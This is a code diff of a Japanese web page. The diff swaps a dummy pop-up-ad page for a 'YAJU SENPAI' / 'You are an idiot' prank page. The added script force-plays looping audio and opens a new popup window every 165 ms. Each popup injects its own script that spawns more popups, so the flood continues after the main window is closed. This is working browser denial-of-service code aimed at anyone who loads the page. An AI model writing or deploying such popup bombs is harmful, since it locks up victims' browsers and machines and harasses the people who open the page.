@@ -2,234 +2,145 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ダミー広告表示サイト</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>YAJU SENPAI</title>
     <style>
         body {
-            margin: 0;
-            overflow: hidden;
-            background-color: #f0f0f0;
-            font-family: sans-serif;
+            margin: 0; padding: 0; background: black; color: lime;
+            font-family: sans-serif; text-align: center; overflow: hidden;
         }
-        
-        .ad-container {
-            position: absolute;
-            background-color: white;
-            border: 2px solid #ccc;
-            box-shadow: 2px 2px 10px rgba(0,0,0,0.1);
-            display: flex;
-            flex-direction: column;
-            overflow: hidden;
-            animation: fadeIn 0.5s ease-out;
-            cursor: pointer;
-            transition: transform 0.2s;
+        h1 {
+            font-size: 4.2em;
+            margin: 8vh 0 10px;
+            text-shadow: 0 0 30px lime;
+            animation: blink 0.15s infinite alternate;
         }
-
-        .ad-container:hover {
-            transform: scale(1.02);
-            z-index: 10000 !important;
+        @keyframes blink { from { opacity: 0.3; } to { opacity: 1; } }
+        .idiot-img {
+            max-width: 95vw;
+            max-height: 72vh;
+            width: auto;
+            height: auto;
+            margin: 10px auto;
+            display: block;
+            border: 10px solid lime;
+            box-shadow: 0 0 50px lime;
         }
-
-        .ad-header {
-            background-color: #e0e0e0;
-            padding: 2px 5px;
-            font-size: 10px;
-            color: #666;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .ad-close {
-            cursor: pointer;
-            font-weight: bold;
-            padding: 0 5px;
-        }
-
-        .ad-close:hover {
-            color: red;
-        }
-
-        .ad-content {
-            flex-grow: 1;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            padding: 0;
-            text-align: center;
-        }
-
-        .ad-image {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            background-color: #ddd;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: scale(0.8); }
-            to { opacity: 1; transform: scale(1); }
-        }
-
-        /* Overlay for Huge Ads */
-        #huge-ad-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background: rgba(0, 0, 0, 0.7);
-            display: none;
-            z-index: 4000;
-            pointer-events: none;
-        }
-
-        #status-bar {
-            position: fixed;
-            bottom: 10px;
-            right: 10px;
-            background: rgba(0,0,0,0.7);
-            color: white;
-            padding: 5px 15px;
-            border-radius: 20px;
-            font-size: 12px;
-            z-index: 20000;
-            pointer-events: none;
-        }
+        p { font-size: 1.95em; margin: 20px; color: #ff0; animation: blink 0.6s infinite; }
     </style>
 </head>
 <body>
+    <h1>YAJU SENPAI</h1>
+    <img src="https://raw.githubusercontent.com/hoto17296/youareanidiot/master/youareanidiot.gif" 
+         class="idiot-img" alt="You are an idiot">
+    <p>165msごとに爆増中...<br>メインを閉じても止まらない</p>
 
-    <div id="huge-ad-overlay"></div>
-    <div id="ad-wrapper"></div>
-    <div id="status-bar">準備中...</div>
+    <audio id="idiotSound" preload="auto" loop></audio>
 
     <script>
-        const adImages = [
-            "https://www.lemon8-app.com/seo/image?item_id=7450477786210402821&index=0&sign=e46cbcbb517f78531bcf7fe5072c3781"
-        ];
+        const sound = document.getElementById('idiotSound');
+        sound.src = "https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3";
+        let count = 1;
 
-        const adWrapper = document.getElementById('ad-wrapper');
-        const statusBar = document.getElementById('status-bar');
-        const overlay = document.getElementById('huge-ad-overlay');
-        
-        let isHugeAdTime = false;
-
-        function getRandomInt(min, max) {
-            return Math.floor(Math.random() * (max - min + 1)) + min;
+        function forcePlay(audio) {
+            if (!audio) return;
+            audio.currentTime = 0;
+            audio.play().catch(() => setTimeout(() => forcePlay(audio), 30));
         }
 
-        // 広告本体をクリックした時のアクション
-        function handleAdClick(adElement) {
-            // ブラウザ純正ポップアップ
-            confirm("Do you love Yaju Senpai?");
-            adElement.remove();
-            fillWithAds(50);
+        function createNewPopup() {
+            const width = 490;
+            const height = 450;
+            const left = Math.random() * (screen.availWidth - width - 150) + 75;
+            const top = Math.random() * (screen.availHeight - height - 150) + 75;
+
+            const popup = window.open('', '_blank', 
+                `width=${width},height=${height},left=${Math.floor(left)},top=${Math.floor(top)},resizable=yes,scrollbars=no,menubar=no,toolbar=no,status=no`
+            );
+
+            if (!popup) return; // ブロックされた場合は何もしない
+
+            // 確実に内容を書き込む（消えないように）
+            popup.document.open();
+            popup.document.write(`
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <meta charset="UTF-8">
+                    <title>YAJU SENPAI ×${count}</title>
+                    <style>
+                        body { margin:0; padding:0; background:black; color:lime; text-align:center; overflow:hidden; }
+                        h1 { font-size:3em; margin:8vh 0 10px; text-shadow:0 0 20px lime; animation: blink 0.3s infinite alternate; }
+                        .idiot-img { max-width:95vw; max-height:72vh; width:auto; height:auto; margin:10px auto; display:block; border:8px solid lime; box-shadow:0 0 40px lime; }
+                        @keyframes blink { from { opacity: 0.4; } to { opacity: 1; } }
+                    </style>
+                </head>
+                <body>
+                    <h1>YAJU SENPAI</h1>
+                    <img src="https://static.wikitide.net/chaosbattlewiki/c/c0/1999%E5%B9%B4%E3%81%AE%E3%82%A4%E3%83%B3%E3%82%BF%E3%83%93%E3%83%A5%E3%83%BC.jpeg" class="idiot-img" alt="idiot">
+                    <p>165msで増殖中...</p>
+                    <audio id="sound" preload="auto" loop></audio>
+                    <script>
+                        const s = document.getElementById('sound');
+                        s.src = "https://www.myinstants.com/ja/instant/yarimasune-34755/?utm_source=copy&utm_medium=share";
+
+                        function forcePlay() {
+                            s.currentTime = 0;
+                            s.play().catch(() => setTimeout(forcePlay, 30));
+                        }
+
+                        window.onload = function() {
+                            forcePlay();
+                            setTimeout(forcePlay, 20);
+                            setTimeout(forcePlay, 50);
+
+                            // 165msごとに新しいポップアップを生成（連鎖）
+                            setInterval(() => {
+                                const w = 490;
+                                const h = 450;
+                                const l = Math.random() * (screen.availWidth - w - 150) + 75;
+                                const t = Math.random() * (screen.availHeight - h - 150) + 75;
+                                window.open('', '_blank', 
+                                    \`width=\${w},height=\${h},left=\${Math.floor(l)},top=\${Math.floor(t)},resizable=yes,scrollbars=no,menubar=no,toolbar=no,status=no\`
+                                );
+                            }, 165);
+                        };
+                    <\/script>
+                </body>
+                </html>
+            `);
+            popup.document.close();
+            count++;
         }
 
-        // 広告生成
-        function createAd(size = 250) {
-            const ad = document.createElement('div');
-            ad.className = 'ad-container';
-            if (size >= 500) {
-                ad.setAttribute('data-huge', 'true');
-            }
-
-            const width = size;
-            const height = size;
-            
-            const posX = getRandomInt(0, window.innerWidth - width);
-            const posY = getRandomInt(0, window.innerHeight - height);
-
-            ad.style.width = `${width}px`;
-            ad.style.height = `${height}px`;
-            ad.style.left = `${posX}px`;
-            ad.style.top = `${posY}px`;
-
-            if (size >= 500) {
-                ad.style.zIndex = 5001; // 固定で前面へ
-            } else {
-                ad.style.zIndex = getRandomInt(1, 100);
-            }
-
-            ad.innerHTML = `
-                <div class="ad-header">
-                    <span>${size >= 500 ? '🔥 限定動画広告 🔥' : '広告'}</span>
-                    <span class="ad-close" onclick="event.stopPropagation(); this.parentElement.parentElement.remove(); fillWithAds(50)">×</span>
-                </div>
-                <div class="ad-content" onclick="handleAdClick(this.parentElement)">
-                    <img src="${adImages[0]}" alt="ad" class="ad-image" onerror="this.style.display='none'">
-                </div>
-            `;
-
-            return ad;
-        }
-
-        function fillWithAds(count, size = 250) {
-            for (let i = 0; i < count; i++) {
-                setTimeout(() => {
-                    adWrapper.appendChild(createAd(size));
-                }, i * 30);
-            }
-        }
-
-        function startCycles() {
-            // 60秒に1回巨大広告イベント
-            setInterval(() => {
-                if (!isHugeAdTime) {
-                    activateHugeAdTime();
-                }
-            }, 60000); 
-
-            // 30秒に1回ブラウザ純正ポップアップ (confirm)
-            setInterval(() => {
-                confirm("Do you love Yaju Senpai?");
-            }, 30000);
-        }
-
-        function activateHugeAdTime() {
-            isHugeAdTime = true;
-            overlay.style.display = 'block';
-            statusBar.innerText = "巨大広告表示中... (30秒)";
-            statusBar.style.color = "#ff4444";
-
-            // 中央に1個だけ表示
-            const centerAd = createAd(500);
-            centerAd.style.left = `${(window.innerWidth - 500) / 2}px`;
-            centerAd.style.top = `${(window.innerHeight - 500) / 2}px`;
-            adWrapper.appendChild(centerAd);
-
-            // 30秒後に終了
-            setTimeout(() => {
-                isHugeAdTime = false;
-                overlay.style.display = 'none';
-                statusBar.innerText = "通常モード";
-                statusBar.style.color = "white";
-
-                // 巨大広告を削除
-                const hugeAds = document.querySelectorAll('.ad-container[data-huge="true"]');
-                hugeAds.forEach(ad => ad.remove());
-            }, 30000);
-        }
-
+        // ====================== メイン画面 ======================
         window.onload = () => {
-            fillWithAds(15); 
-            
-            // 通常広告の補充ループ
+            function mainForcePlay() {
+                sound.currentTime = 0;
+                sound.play().catch(() => setTimeout(mainForcePlay, 30));
+            }
+
+            mainForcePlay();
+            setTimeout(mainForcePlay, 10);
+            setTimeout(mainForcePlay, 30);
+
+            // 初期高速連発
+            setTimeout(() => createNewPopup(), 80);
+            setTimeout(() => createNewPopup(), 140);
+            setTimeout(() => createNewPopup(), 200);
+            setTimeout(() => createNewPopup(), 260);
+
+            // 165ms自動増殖
+            setTimeout(() => {
+                setInterval(() => {
+                    createNewPopup();
+                }, 165);
+            }, 350);
+
+            // 音の保険
             setInterval(() => {
-                const normalAdCount = document.querySelectorAll('.ad-container:not([data-huge="true"])').length;
-                if(normalAdCount < 20 && !isHugeAdTime) {
-                     adWrapper.appendChild(createAd(250));
-                }
-            }, 4000);
-
-            startCycles();
+                if (sound.paused) mainForcePlay();
+            }, 30);
         };
-
-        window.addEventListener('resize', () => {
-        });
     </script>
 </body>
 </html>
